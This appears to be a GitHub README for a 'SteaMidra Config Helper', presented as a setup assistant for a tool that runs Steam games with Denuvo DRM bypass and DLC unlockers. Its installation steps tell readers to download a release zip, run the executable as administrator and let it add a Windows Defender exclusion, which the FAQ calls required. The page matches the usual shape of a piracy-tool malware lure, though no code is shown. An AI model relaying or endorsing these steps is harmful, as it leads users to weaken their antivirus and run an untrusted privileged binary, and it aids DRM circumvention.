# SteaMidra Config Helper

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Stable-success?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop assistant for configuring SteaMidra on Windows — verifies prerequisites, checks LumaCore dependencies, and guides through setup.

<div align="center">

[![Download SteaMidra Config Helper v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logoColor=white)](https://github.com/tunahanyilmaz03/steamidra-config-helper/releases/tag/1.0.0)

</div>

---

## 📋 Overview

SteaMidra is a powerful tool for running Steam games with automatic Denuvo handling and multiplayer support. But getting it working requires several manual steps: unpacking archives, copying LumaCore DLLs, adding Windows Defender exclusions, and placing Lua files correctly.

**SteaMidra Config Helper** automates the verification process. It checks every prerequisite, identifies what's missing, and guides you through fixing it — without digging through documentation or forum posts.

**Who it's for:** users who want SteaMidra working without troubleshooting configuration steps manually.

---

## 🧩 Capabilities

### System Verification
- Detects Steam installation path automatically
- Verifies SteaMidra is present and unpacked
- Checks for required LumaCore files (`dwmapi.dll`, `LumaCore.dll`)

### Windows Defender Setup
- Adds exclusion for `dlc_unlockers/resources` folder
- Verifies exclusion is active
- Alerts if antivirus is blocking SteaMidra components

### Game File Validation
- Validates Lua file presence for supported games
- Checks for missing or outdated files
- Prompts for re-download if needed

### Guided Setup
- Step-by-step wizard for first-time users
- Manual fallback instructions if automatic detection fails
- One-click re-check after manual fixes

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 100 MB | 200 MB |
| **Steam** | Installed | Installed |
| **SteaMidra** | Downloaded and unpacked | Latest version |
| **Permissions** | Administrator | Administrator |

---

## 🔧 Installation

1. Download `SteaMidra-Config-Helper-v1.0.0.zip` using the button above
2. Extract with 7-Zip or WinRAR
3. Right-click `SteaMidraHelper.exe` and select **Run as administrator**
4. Follow the setup wizard — it checks each prerequisite
5. Fix any flagged issues and click **Re-check**
6. Launch SteaMidra once all checks pass

---

## ❓ FAQ

**Do I need SteaMidra installed?**  
Yes — this is a helper, not a replacement. Download and unpack SteaMidra first, then run the helper.

**Does it modify Steam files?**  
No — it only checks paths and verifies files. No modifications to Steam or game files.

**Do I need to disable antivirus?**  
The helper adds a Defender exclusion for SteaMidra's resource folder. This is required for SteaMidra to work correctly.

**Does it work with the latest SteaMidra version?**  
Yes — it checks for current file structure and warns if SteaMidra is outdated.

**What if automatic detection fails?**  
The wizard provides manual instructions for each step. You can also skip checks and re-run them later.

**How do I uninstall?**  
Run `SteaMidraHelper.exe --uninstall` — it removes the helper and its registry entries without touching SteaMidra.

---

## 🗺️ Roadmap — 2026

- [ ] Automatic SteaMidra version detection
- [ ] One-click LumaCore update
- [ ] Multi-language support
- [ ] Community-shared configuration profiles
- [ ] Cloud backup for helper settings

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download SteaMidra Config Helper v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logoColor=white)](https://github.com/tunahanyilmaz03/steamidra-config-helper/releases/tag/1.0.0)

**Version 1.0.0** — Stable Release · Setup Assistant · MIT

</div>
